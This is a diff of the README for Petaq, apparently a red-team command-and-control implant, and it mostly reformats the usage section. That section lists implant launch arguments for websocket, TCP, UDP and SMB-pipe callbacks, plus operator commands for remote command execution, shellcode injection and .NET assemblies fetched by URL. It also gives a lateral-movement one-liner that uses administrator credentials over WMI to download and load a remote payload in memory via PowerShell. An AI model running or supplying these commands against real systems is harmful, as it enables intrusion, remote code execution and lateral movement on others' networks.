@@ -94,33 +94,34 @@ CApplication is shutting down...
 ```
 # Usage Examples
 Petaq Implant Run Arguments:
-    It runs Petaq Implants to connect to a Petaq Service using Websocket (If not configured on Configuration.cs)
+*It runs Petaq Implants to connect to a Petaq Service using Websocket (If not configured on Configuration.cs)
     `petaqimplant.exe ws://172.16.121.1/ws`
     `petaqimplant.exe wss://172.16.121.1:443/ws` (SSL)
-    It runs Petaq Implant on TCP 8000 and wait for another implant to link it to the Petaq Service
+*It runs Petaq Implant on TCP 8000 and wait for another implant to link it to the Petaq Service
     `petaqimplant.exe tcp 8000` 
-    It runs Petaq Implant on UDP 8000 and wait for another implant to link it to the Petaq Service
+*It runs Petaq Implant on UDP 8000 and wait for another implant to link it to the Petaq Service
     `petaqimplant.exe udp 8000` 
-    It runs Petaq Implant on SMB Named Pipe pipename1 and wait for another implant to link it to the Petaq Service
+*It runs Petaq Implant on SMB Named Pipe pipename1 and wait for another implant to link it to the Petaq Service
     `petaqimplant.exe smb pipename1` 
 
 Petaq Service Commands:
+```
     Help:
-        `help`
+        help
     List the Implants:
-        `list`
+        list
     Use the Implant:
-        `use SessionID`
+        use SessionID
     Remove the Implant:
-        `remove SessionID`
+        remove SessionID
     Show Routes for Linked Implants:
-        `route`
+        route
     Exit:
-        `exit`
-        `terminate`
-
+        exit
+        terminate
+```
 Practical Examples on Petaq Implant in Interaction (use ImplantID):
-    Usage Examples:
+Usage Examples:
 ```
         exec cmd /c dir
         exec net use
@@ -136,24 +137,23 @@ Practical Examples on Petaq Implant in Interaction (use ImplantID):
         link smb://127.0.0.1
         link smb://127.0.0.1/petaq_comm
 ```
-    Link operations:
+Link operations:
 ```
         route
         sessions
         link URI
         unlink ID
 ```
-
-    Lateral movement:
-        `lateralmovement wmiexec domain=galaxy username=administrator password=Password3 host=10.0.0.1 command="powershell –c $m = new- object net.webclient;$Url = 'http://172.16.121.1';$dba =$m.downloaddata($Url);$a =[System.Reflection.Assembly]::Load($dba); $a.EntryPoint.Invoke(0,@(,[string[]]@()))"`
-
-    Execute a command/binary:
+Lateral movement:
+```
+        lateralmovement wmiexec domain=galaxy username=administrator password=Password3 host=10.0.0.1 command="powershell –c $m = new- object net.webclient;$Url = 'http://172.16.121.1';$dba =$m.downloaddata($Url);$a =[System.Reflection.Assembly]::Load($dba); $a.EntryPoint.Invoke(0,@(,[string[]]@()))"
+```
+Execute a command/binary:
 ```
         exec cmd.exe /c dir
         exec powershell -c Write-Output($env:UserName)
 ```
-
-    Execute a command/binary/assembly as a thread (no wait, no output):
+Execute a command/binary/assembly as a thread (no wait, no output):
 ```
         execthread cmd.exe /c dir
         execthread powershell -c Write-Output($env:UserName)
@@ -162,33 +162,28 @@ Practical Examples on Petaq Implant in Interaction (use ImplantID):
         execthread-sharpcode url http://127.0.0.1/Sharpcode.src Parameters
         execthread-sharpcode base64 BASE64_ENCODED_SHARPCODE Parameters
 ```
-
-    Inline run for .NET source code:
+Inline run for .NET source code:
 ```
         exec-sharpdirect SHARPCODE
         exec-sharpdirect base64 BASE64_ENCODED_SHARPCODE
 ```
-
-    Execute a .NET assembly:
+Execute a .NET assembly:
 ```
         exec-sharpassembly url http://127.0.0.1/Assembly.exe Parameters
         exec-sharpassembly base64 http://127.0.0.1/Assembly.b64 Parameters
 ```
-
-    Compile & Execute .NET source code:
+Compile & Execute .NET source code:
 ```
         exec-sharpcode url http://127.0.0.1/Sharpcode.src Parameters
         exec-sharpcode base64 BASE64_ENCODED_SHARPCODE Parameters
 ```
-        
-    Execute Shellcode:
+Execute Shellcode:
 ```
         exec-shellcode url http://127.0.0.1/Shellcode.bin ARCH64 T1
         exec-shellcode url http://127.0.0.1/Shellcode.bin ARCH32 T2
         exec-shellcode base64 http://127.0.0.1/Shellcode.b64 ARCH64 T1
         exec-shellcode base64 http://127.0.0.1/Shellcode.b64 ARCH32 T2
 ```
-        
     Exit:
 ```
         exit
